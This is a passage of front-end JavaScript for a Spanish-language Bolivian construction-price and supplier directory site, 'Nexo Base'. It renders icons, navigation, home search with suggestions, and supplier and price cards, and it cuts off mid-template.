    'user-plus': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 00-4-4H5a4 4 0 00-4-4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg>',
    crown: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 20h20l-2-12-5 5-3-7-3 7-5-5z"/><line x1="2" y1="20" x2="22" y2="20"/></svg>',
    bell: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 01-3.46 0"/></svg>',
    clock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12,6 12,12 16,14"/></svg>',
    menu: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>',
    code: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16,18 22,12 16,6"/><polyline points="8,6 2,12 8,18"/></svg>',
    cpu: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>',
    zap: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13,2 3,14 12,14 11,22 21,10 12,10"/></svg>',
    play: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5,3 19,12 5,21"/></svg>',
    server: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>',
    lock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>',
    info: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>',
    calculator: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="2" width="16" height="20" rx="2"/><line x1="8" y1="6" x2="16" y2="6"/><line x1="8" y1="10" x2="8.01" y2="10"/><line x1="12" y1="10" x2="12.01" y2="10"/><line x1="16" y1="10" x2="16.01" y2="10"/><line x1="8" y1="14" x2="8.01" y2="14"/><line x1="12" y1="14" x2="12.01" y2="14"/><line x1="16" y1="14" x2="16" y2="18"/><line x1="8" y1="18" x2="12" y2="18"/></svg>',
    'refresh-cw': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23,4 23,10 17,10"/><polyline points="1,20 1,14 7,14"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10"/><path d="M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>',
    'chevron-right': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9,18 15,12 9,6"/></svg>',
    ruler: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="8" width="20" height="8" rx="1"/><line x1="6" y1="8" x2="6" y2="12"/><line x1="10" y1="8" x2="10" y2="12"/><line x1="14" y1="8" x2="14" y2="12"/><line x1="18" y1="8" x2="18" y2="12"/></svg>',
    hammer: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 6l3-3 5 5-3 3"/><path d="M16.5 8.5L9 16l-1 4-4 1 1-4 7.5-7.5"/></svg>',
    book: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19.5A2.5 2.5 0 016.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 014 19.5v-15A2.5 2.5 0 016.5 2z"/></svg>',
    copy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>',
    sliders: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" y1="21" x2="4" y2="14"/><line x1="4" y1="10" x2="4" y2="3"/><line x1="12" y1="21" x2="12" y2="12"/><line x1="12" y1="8" x2="12" y2="3"/><line x1="20" y1="21" x2="20" y2="16"/><line x1="20" y1="12" x2="20" y2="3"/><line x1="1" y1="14" x2="7" y2="14"/><line x1="9" y1="8" x2="15" y2="8"/><line x1="17" y1="16" x2="23" y2="16"/></svg>',
    'arrow-up': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5,12 12,5 19,12"/></svg>',
    'arrow-down': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19,12 12,19 5,12"/></svg>',
    'inbox-check': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22,12 16,12 14,15 10,15 8,12 2,12"/><path d="M5.45 5.11L2 12v6a2 2 0 002 2h16a2 2 0 002-2v-6l-3.45-6.89A2 2 0 0016.76 4H7.24a2 2 0 00-1.79 1.11z"/></svg>',
};

function icon(name, size = 20) {
    return `<span class="icon" style="width:${size}px;height:${size}px;display:inline-flex">${ICONS[name] || ''}</span>`;
}

// ── Navigation ─────────────────────────────────────────────────
function navigate(page, params) {
    state.currentPage = page;
    state.currentParams = params || null;
    window.scrollTo(0, 0);
    const url = (page === 'productDetail' && params && params.id)
        ? `/p/${params.id}`
        : '/';
    const skipPush = params && params._noPushState;
    if (!skipPush && window.location.pathname !== url) {
        history.pushState({ page, params }, '', url);
    }
    renderApp();
}

window.addEventListener('popstate', (e) => {
    const m = window.location.pathname.match(/^\/p\/(\d+)$/);
    if (m) {
        state.currentPage = 'productDetail';
        state.currentParams = { id: parseInt(m[1], 10), _noPushState: true };
    } else {
        state.currentPage = 'home';
        state.currentParams = null;
    }
    window.scrollTo(0, 0);
    renderApp();
});

// ── Render: App shell ──────────────────────────────────────────
function renderApp() {
    const app = document.getElementById('app');

    const publicPages = {
        home:      { title: 'Inicio',       icon: 'home',     render: renderHome },
        prices:    { title: 'Precios',       icon: 'tag',      render: renderPublicPrices },
        suppliers: { title: 'Proveedores',   icon: 'users',    render: renderPublicSuppliers },
    };

    const authPages = {
        pedidos:      { title: 'Cotizaciones', icon: 'clipboard',  render: renderPedidos },
        presupuestos: { title: 'Presupuestos', icon: 'calculator', render: renderPresupuestos },
        biblioteca:   { title: 'Biblioteca',   icon: 'book',       render: renderBiblioteca },
        company:      { title: 'Mi Empresa',   icon: 'building',   render: renderCompany },
    };

    const staffPages = isStaff() ? {
        inbox:     { title: 'Inbox',        icon: 'mail',       render: renderInbox },
        curacion:  { title: 'Curacion',     icon: 'inbox-check', render: renderCuracion },
        admin:     { title: 'Admin',        icon: 'settings',   render: renderAdmin },
    } : {};

    const hiddenPages = {
        legal: { title: 'Aviso Legal y Terminos de Uso', render: renderLegal },
        productDetail: { title: 'Detalle de producto', render: renderProductDetail },
    };

    const allPages = { ...publicPages, ...hiddenPages, ...(state.user ? { ...authPages, ...staffPages } : {}) };

    app.innerHTML = `
        ${renderTopbar(publicPages, { ...authPages, ...staffPages })}
        <div class="app-container">
            <div class="page" id="page-content"></div>
        </div>
        <div class="footer" id="app-footer">
            <div class="footer-content">
                <div class="footer-brand">
                    <svg width="24" height="24" viewBox="0 0 48 48" fill="none">
                        <rect width="48" height="48" rx="10" fill="rgba(255,255,255,0.15)"/>
                        <path d="M12 36V16l12-6 12 6v20" stroke="white" stroke-width="2.5" fill="none"/>
                        <path d="M20 36V26h8v10" stroke="white" stroke-width="2"/>
                    </svg>
                    <span>${_siteConfig?.site_name || 'Nexo Base'}</span>
                </div>
                <div class="footer-text">${_siteConfig?.footer_text || 'Precios de construccion actualizados'}</div>
                <div class="footer-links">
                    ${_siteConfig?.contact_email ? `<a href="mailto:${esc(_siteConfig.contact_email)}">${icon('mail',14)} ${esc(_siteConfig.contact_email)}</a>` : ''}
                    ${_siteConfig?.contact_whatsapp ? `<a href="https://wa.me/${_siteConfig.contact_whatsapp.replace(/[^0-9]/g,'')}" target="_blank" rel="noopener">${icon('whatsapp',14)} WhatsApp</a>` : ''}
                    <a href="#" onclick="event.preventDefault();navigate('legal')">${icon('lock',14)} Aviso Legal y Terminos</a>
                </div>
            </div>
        </div>
        ${renderMobileNav()}
        <div id="toast-container" class="toast-container"></div>
    `;

    const pageConfig = allPages[state.currentPage];
    if (pageConfig) {
        pageConfig.render();
    } else {
        navigate('home');
        return;
    }
}

function renderTopbar(publicPages, authPages) {
    const navItems = Object.entries(publicPages).map(([key, cfg]) => `
        <button class="topbar-nav-item${state.currentPage === key ? ' active' : ''}"
                onclick="navigate('${key}')">
            ${cfg.title}
        </button>
    `).join('');

    const authNav = state.user
        ? Object.entries(authPages).map(([key, cfg]) => `
            <button class="topbar-nav-item${state.currentPage === key ? ' active' : ''}"
                    onclick="navigate('${key}')">
                ${cfg.title}
            </button>
        `).join('')
        : '';

    const cartCount = state.cart.length;
    const cartBadge = state.user && cartCount > 0
        ? `<button class="topbar-btn" onclick="showCartModal()" title="Mi carrito" style="position:relative">
               ${icon('shopping-cart', 18)}
               <span class="cart-badge">${cartCount}</span>
           </button>`
        : (state.user ? `<button class="topbar-btn" onclick="showCartModal()" title="Mi carrito">${icon('shopping-cart', 18)}</button>` : '');

    const notifBell = state.user
        ? `<button class="topbar-btn notif-bell-btn" onclick="toggleNotifDropdown(event)" title="Notificaciones" style="position:relative">
               ${icon('bell', 18)}
               <span class="notif-badge" id="notif-badge" style="display:none">0</span>
           </button>`
        : '';

    const userActions = state.user
        ? `${cartBadge}${notifBell}
           <span class="topbar-btn topbar-username">${esc(state.user.full_name)}</span>
           <button class="topbar-btn topbar-logout" onclick="logout()" title="Cerrar sesion">${icon('logout', 16)}</button>`
        : `<button class="topbar-btn-accent topbar-btn" onclick="showLoginModal()">
               ${icon('login', 16)} Ingresar
           </button>`;

    return `
        <div class="topbar">
            <div class="topbar-logo" onclick="navigate('home')">
                <svg width="32" height="32" viewBox="0 0 48 48" fill="none">
                    <rect width="48" height="48" rx="10" fill="rgba(255,255,255,0.2)"/>
                    <path d="M12 36V16l12-6 12 6v20" stroke="white" stroke-width="2.5" fill="none"/>
                    <path d="M20 36V26h8v10" stroke="white" stroke-width="2"/>
                </svg>
                NEXO BASE
            </div>
            <div class="topbar-nav">
                ${navItems}${authNav}
            </div>
            <div class="topbar-spacer"></div>
            <div class="topbar-actions">
                ${userActions}
            </div>
        </div>
    `;
}

function renderMobileNav() {
    const tabs = [
        { key: 'home', label: 'Inicio', ico: 'home' },
        { key: 'prices', label: 'Precios', ico: 'tag' },
        { key: 'suppliers', label: 'Proveedores', ico: 'users' },
    ];
    if (state.user) {
        tabs.push({ key: 'pedidos', label: 'Cotizaciones', ico: 'clipboard' });
        tabs.push({ key: '_more', label: 'Mas', ico: 'menu' });
    } else {
        tabs.push({ key: '_login', label: 'Ingresar', ico: 'login' });
    }

    const items = tabs.map(t => `
        <button class="mnav-item${state.currentPage === t.key ? ' active' : ''}"
                onclick="${t.key === '_more' ? 'openMobileMenu()' : t.key === '_login' ? 'showLoginModal()' : `navigate('${t.key}')`}">
            ${icon(t.ico, 22)}
            <span>${t.label}</span>
        </button>
    `).join('');

    return `<nav class="mobile-nav"><div class="mobile-nav-items">${items}</div></nav>`;
}

function openMobileMenu() {
    const menuPages = [];
    if (state.user) {
        menuPages.push({ key: 'pedidos', label: 'Cotizaciones', ico: 'clipboard' });
        menuPages.push({ key: 'presupuestos', label: 'Presupuestos', ico: 'calculator' });
        menuPages.push({ key: 'biblioteca', label: 'Biblioteca de insumos', ico: 'book' });
        menuPages.push({ key: 'company', label: 'Mi Empresa', ico: 'building' });
    }
    if (isStaff()) {
        menuPages.push({ key: '_divider' });
        menuPages.push({ key: 'inbox', label: 'Inbox', ico: 'mail' });
        menuPages.push({ key: 'curacion', label: 'Curacion de precios', ico: 'inbox-check' });
        menuPages.push({ key: 'admin', label: 'Admin', ico: 'settings' });
    }
    if (state.user) {
        menuPages.push({ key: '_divider2' });
        menuPages.push({ key: '_cart', label: 'Mi Carrito', ico: 'shopping-cart' });
        menuPages.push({ key: '_logout', label: 'Cerrar Sesion', ico: 'logout' });
    }

    const items = menuPages.map(p => {
        if (p.key.startsWith('_divider')) return '<div class="mobile-menu-divider"></div>';
        const active = state.currentPage === p.key ? ' active' : '';
        const action = p.key === '_cart' ? 'showCartModal();closeMobileMenu()'
            : p.key === '_logout' ? 'logout();closeMobileMenu()'
            : `navigate('${p.key}');closeMobileMenu()`;
        return `<button class="mobile-menu-item${active}" onclick="${action}">${icon(p.ico, 20)} ${p.label}</button>`;
    }).join('');

    const overlay = document.createElement('div');
    overlay.className = 'mobile-menu-overlay';
    overlay.id = 'mobile-menu';
    overlay.onclick = (e) => { if (e.target === overlay) closeMobileMenu(); };
    overlay.innerHTML = `
        <div class="mobile-menu-panel">
            <div class="mobile-menu-handle"></div>
            ${items}
        </div>
    `;
    document.body.appendChild(overlay);
}

function closeMobileMenu() {
    document.getElementById('mobile-menu')?.remove();
}

// ── Render: Home (public) ──────────────────────────────────────
async function renderHome() {
    const page = document.getElementById('page-content');
    page.innerHTML = `
        <div class="home-hero">
            <div class="home-hero-inner">
                <h1 class="home-title">Precios de Construccion</h1>
                <p class="home-hint">Bolivia</p>
                <div class="home-search-wrap">
                    <div class="home-search">
                        ${icon('search', 18)}
                        <input id="hero-search-input" type="search"
                               placeholder="Buscar materiales o proveedores..."
                               value="${esc(state.searchQuery)}"
                               oninput="debounceHeroSuggest()"
                               onkeydown="if(event.key==='Enter')heroSearch()">
                    </div>
                    <div id="hero-suggestions" class="hero-suggestions" style="display:none"></div>
                </div>
            </div>
        </div>

        <div class="home-cats" id="home-categories">
            <span class="hcat${!state.selectedCategory ? ' active' : ''}" onclick="selectCategory(null)">Todos</span>
        </div>
        <div class="home-subcats" id="home-subcategories" style="display:none"></div>

        <div id="home-stats" class="home-stats"></div>

        <div id="search-summary" class="search-summary" style="display:none"></div>

        <div class="home-section" id="home-prices-section" style="display:none">
            <div class="home-section-header">
                <span class="home-section-title">Actualizados recientemente</span>
                <button class="home-section-link" onclick="navigate('prices')">Ver todos &rarr;</button>
            </div>
            <div class="price-grid" id="home-prices"></div>
        </div>

        <div class="home-section" id="home-suppliers-section" style="display:none">
            <div class="home-section-header">
                <span class="home-section-title">Proveedores destacados</span>
                <button class="home-section-link" onclick="navigate('suppliers')">Ver todos &rarr;</button>
            </div>
            <div class="supplier-grid" id="home-suppliers"></div>
        </div>
    `;

    loadHomeCategories();
    loadHomeSuppliers();
    loadHomePrices();
    loadHomeStats();
}

async function loadHomeCategories() {
    try {
        const resp = await API.priceCategories();
        if (resp.ok && resp.data.length) {
            state.categoryTree = resp.data;
            const container = document.getElementById('home-categories');
            const chips = resp.data.map(c => {
                const meta = CATEGORY_META[c.name] || { label: c.name, icon: '' };
                const label = meta.label || c.name;
                return `<span class="hcat${state.selectedCategory === c.name ? ' active' : ''}"
                              onclick="selectCategory('${escJs(c.name)}')">${meta.icon || ''} ${esc(label)} <small>(${c.count})</small></span>`;
            }).join('');
            container.innerHTML = `
                <span class="hcat${!state.selectedCategory ? ' active' : ''}" onclick="selectCategory(null)">Todos</span>
                ${chips}
            `;
        }
        renderHomeSubcategories();
    } catch {}
}

function renderHomeSubcategories() {
    const sub = document.getElementById('home-subcategories');
    if (!sub) return;
    if (!state.selectedCategory) { sub.style.display = 'none'; sub.innerHTML = ''; return; }
    const node = (state.categoryTree || []).find(c => c.name === state.selectedCategory);
    const subs = node?.subcategories || [];
    if (!subs.length) { sub.style.display = 'none'; sub.innerHTML = ''; return; }
    const chips = subs.map(s => {
        const active = state.selectedSubcategory === s.name;
        const label = s.name.replace(/_/g, ' ');
        return `<span class="hsub${active ? ' active' : ''}" onclick="selectSubcategory('${escJs(s.name)}')">${esc(label)} <small>(${s.count})</small></span>`;
    }).join('');
    sub.innerHTML = `<span class="hsub${!state.selectedSubcategory ? ' active' : ''}" onclick="selectSubcategory(null)">Todas</span>${chips}`;
    sub.style.display = '';
}

async function loadHomeSuppliers() {
    let params = '?limit=6';
    if (state.selectedCategory) params += `&category=${encodeURIComponent(state.selectedCategory)}`;
    if (state.selectedDepartment) params += `&department=${encodeURIComponent(state.selectedDepartment)}`;

    try {
        const resp = await API.publicSuppliers(params);
        const container = document.getElementById('home-suppliers');
        const section = document.getElementById('home-suppliers-section');
        if (resp.ok && resp.data.length) {
            container.innerHTML = resp.data.map(renderSupplierCard).join('');
            const title = section?.querySelector('.home-section-title');
            if (title) title.textContent = 'Proveedores destacados';
            if (section) section.style.display = '';
        }
    } catch {}
}

async function loadHomePrices() {
    let params = '?limit=8&sort=recent';
    if (state.selectedCategory) params += `&category=${encodeURIComponent(state.selectedCategory)}`;
    if (state.selectedSubcategory) params += `&subcategory=${encodeURIComponent(state.selectedSubcategory)}`;

    try {
        const resp = await API.publicPrices(params);
        const container = document.getElementById('home-prices');
        const section = document.getElementById('home-prices-section');
        if (resp.ok && resp.data.length) {
            container.innerHTML = resp.data.map(renderPriceCard).join('');
            // Reset title in case we came back from a search
            const title = section?.querySelector('.home-section-title');
            if (title) title.textContent = 'Actualizados recientemente';
            if (section) section.style.display = '';
        }
    } catch {}
}

async function loadHomeStats() {
    try {
        const [prices, suppliers] = await Promise.all([
            API.publicPrices('?limit=1'),
            API.publicSuppliers('?limit=1'),
        ]);
        const container = document.getElementById('home-stats');
        const totalPrices = prices.ok ? prices.total : 0;
        const totalSuppliers = suppliers.ok ? suppliers.total : 0;
        if (totalPrices > 0 || totalSuppliers > 0) {
            container.innerHTML = `
                <div class="hstat"><strong>${totalPrices}</strong> precios</div>
                <span class="hstat-dot"></span>
                <div class="hstat"><strong>${totalSuppliers}</strong> proveedores</div>
                <span class="hstat-dot"></span>
                <div class="hstat"><strong>${Object.keys(CATEGORY_META).length}+</strong> categorias</div>
            `;
        }
    } catch {}
}

function selectCategory(cat) {
    state.selectedCategory = cat;
    state.selectedSubcategory = null;
    loadHomeCategories();
    loadHomeSuppliers();
    loadHomePrices();
}

function selectSubcategory(sub) {
    state.selectedSubcategory = sub;
    renderHomeSubcategories();
    loadHomePrices();
}

function heroSearch() {
    const input = document.getElementById('hero-search-input');
    state.searchQuery = (input?.value || '').trim();
    const sugEl = document.getElementById('hero-suggestions');
    if (sugEl) sugEl.style.display = 'none';
    if (state.searchQuery.length >= 2) {
        // Search both prices and suppliers on home page
        heroSearchResults(state.searchQuery);
    } else {
        // Reset to default home view
        const summary = document.getElementById('search-summary');
        if (summary) { summary.style.display = 'none'; summary.innerHTML = ''; }
        loadHomeSuppliers();
        loadHomePrices();
    }
}

let _heroSuggestTimer;
function debounceHeroSuggest() {
    clearTimeout(_heroSuggestTimer);
    _heroSuggestTimer = setTimeout(heroSuggest, 300);
}

async function heroSuggest() {
    const input = document.getElementById('hero-search-input');
    const q = (input?.value || '').trim();
    const sugEl = document.getElementById('hero-suggestions');
    if (!sugEl) return;
    if (q.length < 2) { sugEl.style.display = 'none'; return; }

    try {
        const resp = await API.publicSuppliers(`?q=${encodeURIComponent(q)}&limit=5`);
        if (!resp.ok || !resp.data.length) { sugEl.style.display = 'none'; return; }

        sugEl.innerHTML = resp.data.map(s => {
            const desc = s.description ? `<span class="hero-sug-desc">${esc(s.description).substring(0, 60)}...</span>` : '';
            return `<div class="hero-sug-item" onclick="showPublicSupplierDetail(${s.id});document.getElementById('hero-suggestions').style.display='none'">
                <div class="hero-sug-name">${icon('building', 14)} ${esc(s.trade_name || s.name)}</div>
                ${desc}
            </div>`;
        }).join('') + `<div class="hero-sug-item hero-sug-action" onclick="heroSearch()">
            ${icon('search', 14)} Buscar "${esc(q)}" en precios y proveedores
        </div>`;
        sugEl.style.display = '';
    } catch { sugEl.style.display = 'none'; }
}

async function heroSearchResults(q) {
    const suppSection = document.getElementById('home-suppliers-section');
    const suppContainer = document.getElementById('home-suppliers');
    const priceSection = document.getElementById('home-prices-section');
    const priceContainer = document.getElementById('home-prices');
    const summary = document.getElementById('search-summary');

    // Build query params with active filters
    let suppParams = `?q=${encodeURIComponent(q)}&limit=12`;
    if (state.selectedDepartment) {
        suppParams += `&department=${encodeURIComponent(state.selectedDepartment)}`;
    }
    if (state.selectedCategory) {
        suppParams += `&category=${encodeURIComponent(state.selectedCategory)}`;
    }

    // Fetch in parallel: smart-search para precios, normal para proveedores
    const [priceResp, suppResp] = await Promise.all([
        API.smartSearch(q, state.selectedCategory || null, 12).catch(() => ({ ok: false })),
        API.publicSuppliers(suppParams).catch(() => ({ ok: false })),
    ]);

    const priceData = priceResp.ok ? (priceResp.data || []) : [];
    const suggestions = priceResp.ok ? (priceResp.suggestions || []) : [];
    const priceCount = priceData.length;
    const suppCount = suppResp.ok ? (suppResp.total ?? suppResp.data?.length ?? 0) : 0;

    // Render prices (primary result)
    if (priceData.length) {
        priceContainer.innerHTML = priceData.map(renderPriceCard).join('');
        priceSection.style.display = '';
        const title = priceSection.querySelector('.home-section-title');
        if (title) title.textContent = `Materiales para "${q}"`;
    } else if (suggestions.length) {
        // Sin match exacto, pero hay sugerencias semanticas
        priceContainer.innerHTML = `
            <div class="search-suggest-banner">
                <div class="search-suggest-title">${icon('search', 16)} No encontramos exactamente "<strong>${esc(q)}</strong>". Quiza buscabas:</div>
                <div class="search-suggest-chips">
                    ${suggestions.slice(0, 5).map(s => `
                        <span class="search-suggest-chip" onclick="openProduct(${s.id})">
                            ${esc(s.name)}${s.ref_price ? ` · <strong>Bs ${Number(s.ref_price).toFixed(2)}</strong>/${esc(s.uom || '')}` : ''}
                        </span>
                    `).join('')}
                </div>
            </div>
            ${suggestions.map(renderPriceCard).join('')}
        `;
        priceSection.style.display = '';
        const title = priceSection.querySelector('.home-section-title');
        if (title) title.textContent = `Sugerencias relacionadas con "${q}"`;
    } else {
        priceSection.style.display = 'none';
    }

    // Render suppliers (secondary result)
    if (suppResp.ok && suppResp.data?.length) {
        suppContainer.innerHTML = suppResp.data.map(renderSupplierCard).join('');
        suppSection.style.display = '';
        const title = suppSection.querySelector('.home-section-title');
        if (title) title.textContent = `Proveedores para "${q}"`;
    } else {
        suppSection.style.display = 'none';
    }

    // Render summary bar at top
    if (summary) {
        const filterChips = [];
        if (state.selectedCategory) {
            const meta = CATEGORY_META[state.selectedCategory] || { label: state.selectedCategory };
            filterChips.push(`<span class="search-summary-filter">${esc(meta.label || state.selectedCategory)}</span>`);
        }
        if (state.selectedDepartment) {
            filterChips.push(`<span class="search-summary-filter">${esc(state.selectedDepartment)}</span>`);
        }
        const filterHtml = filterChips.length ? ` · ${filterChips.join(' ')}` : '';

        if (priceCount === 0 && suppCount === 0) {
            summary.innerHTML = `
                <div class="search-summary-inner">
                    <span class="search-summary-empty">Sin resultados para <strong>"${esc(q)}"</strong>${filterHtml}</span>
                    <button class="search-summary-clear" onclick="clearHeroSearch()">Limpiar busqueda</button>
                </div>`;
        } else {
            summary.innerHTML = `
                <div class="search-summary-inner">
                    <span class="search-summary-counts">
                        <strong>${priceCount}</strong> ${priceCount === 1 ? 'material' : 'materiales'} ·
                        <strong>${suppCount}</strong> ${suppCount === 1 ? 'proveedor' : 'proveedores'}
                        para <strong>"${esc(q)}"</strong>${filterHtml}
                    </span>
                    <button class="search-summary-clear" onclick="clearHeroSearch()">Limpiar</button>
                </div>`;
        }
        summary.style.display = '';
    }
}

function clearHeroSearch() {
    const input = document.getElementById('hero-search-input');
    if (input) input.value = '';
    state.searchQuery = '';
    const summary = document.getElementById('search-summary');
    if (summary) { summary.style.display = 'none'; summary.innerHTML = ''; }
    loadHomeSuppliers();
    loadHomePrices();
}

// ── Render: Supplier card (reusable) ───────────────────────────
function renderSupplierCard(s) {
    const cats = (s.categories || []).map(c => {
        const meta = CATEGORY_META[c] || { label: c };
        return `<span class="supplier-cat">${esc(meta.label || c)}</span>`;
    }).join('');

    const location = [s.city, s.department].filter(Boolean).join(', ');

    // Anonimo: contactos bloqueados. Muestra boton que abre login.
    const locked = s.contacts_locked;
    const waBtn = s.whatsapp
        ? `<a href="https://wa.me/${s.whatsapp.replace(/[^0-9]/g, '')}" target="_blank" rel="noopener"
              class="btn-whatsapp" onclick="event.stopPropagation()">
              ${icon('whatsapp', 16)} WhatsApp
           </a>`
        : (locked && s.has_whatsapp
            ? `<button class="btn-whatsapp btn-locked" onclick="event.stopPropagation();showLoginModal()" title="Registrate para ver el contacto">
                  ${icon('lock', 14)} WhatsApp
               </button>`
            : '');

    const callBtn = s.phone
        ? `<a href="tel:${s.phone}" class="btn-call" onclick="event.stopPropagation()">
              ${icon('phone', 16)} Llamar
           </a>`
        : (locked && s.has_phone
            ? `<button class="btn-call btn-locked" onclick="event.stopPropagation();showLoginModal()" title="Registrate para ver el contacto">
                  ${icon('lock', 14)} Llamar
               </button>`
            : '');

    const rating = s.rating > 0
        ? `<span style="color:#f59e0b;font-size:13px">${icon('star', 14)} ${s.rating.toFixed(1)}</span>`
        : '';

    const desc = s.description
        ? `<div class="supplier-desc">${esc(s.description)}</div>`
        : '';

    const opCities = (s.operating_cities || []).length > 1
        ? `<div class="supplier-opcities">${icon('map-pin', 12)} ${esc(s.operating_cities.join(', '))}</div>`
        : '';

    const featuredBadge = s.is_featured
        ? `<span class="supplier-featured" title="Proveedor destacado${s.subscription_tier && s.subscription_tier !== 'none' ? ' - ' + esc(s.subscription_tier) : ''}">${icon('star', 12)} Destacado</span>`
        : '';
    const cardClass = s.is_featured ? 'supplier-card supplier-card-featured' : 'supplier-card';

    return `
        <div class="${cardClass}" onclick="showPublicSupplierDetail(${s.id})" style="cursor:pointer">
            <div class="supplier-card-header">
                <div>
                    <div class="supplier-name">${esc(s.trade_name || s.name)} ${featuredBadge}</div>
                    <div class="supplier-location">${icon('map', 14)} ${esc(location || 'Bolivia')}</div>
                </div>
                ${rating}
            </div>
            ${desc}
            ${opCities}
            <div class="supplier-categories">${cats || '<span style="font-size:12px;color:var(--gray-400)">Sin categorias</span>'}</div>
            <div class="supplier-actions">
                ${waBtn}
                ${callBtn}
            </div>
        </div>
    `;
}

// ── Render: Price card (reusable) ──────────────────────────────
function renderPriceCard(p) {
    if (p.type === 'group') return renderGroupCard(p);
    const addBtn = state.user ? `<button class="btn-cart-add" onclick="event.stopPropagation();addToCart(${p.id || 'null'},'${escJs(p.name)}','${escJs(p.uom||'')}',${p.ref_price||'null'})" title="Agregar al carrito">${icon('plus',14)}</button>` : '';
    const mapBtn = p.id ? `<button class="btn-map-suppliers" onclick="event.stopPropagation();viewSuppliersForInsumo(${p.id}, '${escJs(p.name)}')" title="Ver proveedores de este material en el mapa">${icon('map-pin', 14)}</button>` : '';
    const specLink = p.spec_url ? `<a href="${esc(safeUrl(p.spec_url))}" target="_blank" rel="noopener" class="spec-link" onclick="event.stopPropagation()" title="Ficha tecnica">${icon('file-text',13)} Ficha</a>` : '';
    const clickAttr = p.id ? `onclick="openProduct(${p.id})" style="cursor:pointer"` : '';
    return `
        <div class="price-card" ${clickAttr}>
            <div class="price-info">
                <div class="price-name">${esc(p.name)}</div>
                <div class="price-detail">${p.category ? esc(p.category) : ''} ${p.uom ? '&middot; ' + esc(p.uom) : ''} ${specLink}</div>
            </div>
            <div style="display:flex;align-items:center;gap:6px">
                <div class="price-value">
                    ${p.ref_price ? p.ref_price.toFixed(2) : '--.--'}
                    <span class="price-currency">${esc(p.ref_currency || 'BOB')}</span>
                </div>
                ${mapBtn}
                ${addBtn}
            </div>
        </div>
    `;
}

function viewSuppliersForInsumo(insumoId, insumoName) {
    navigate('suppliers', { insumoId, insumoName });
}

function renderGroupCard(g) {
    const priceText = g.price_range.min != null
        ? (g.price_range.min === g.price_range.max
            ? g.price_range.min.toFixed(2)
            : `${g.price_range.min.toFixed(2)} - ${g.price_range.max.toFixed(2)}`)
        : '--.--';
    const cardId = `group-card-${g.id}`;
    return `
        <div class="price-card price-card-group" id="${cardId}">
            <div style="width:100%">
                <div style="display:flex;justify-content:space-between;align-items:center;cursor:pointer"
                     onclick="toggleGroupVariants(${g.id})">
                    <div class="price-info">
                        <div class="price-name">${esc(g.name)}</div>
                        <div class="price-detail">
                            ${g.category ? esc(g.category) + ' &middot; ' : ''}${g.member_count} variantes${g.variant_label ? ' &middot; ' + esc(g.variant_label) : ''}
                        </div>
                    </div>
                    <div style="display:flex;align-items:center;gap:8px">
                        <div class="price-value">
                            ${priceText}
                            <span class="price-currency">${esc(g.ref_currency || 'BOB')}</span>
                        </div>
                        <span class="group-toggle-icon" id="group-icon-${g.id}">${icon('chevron-down', 16)}</span>
                    </div>
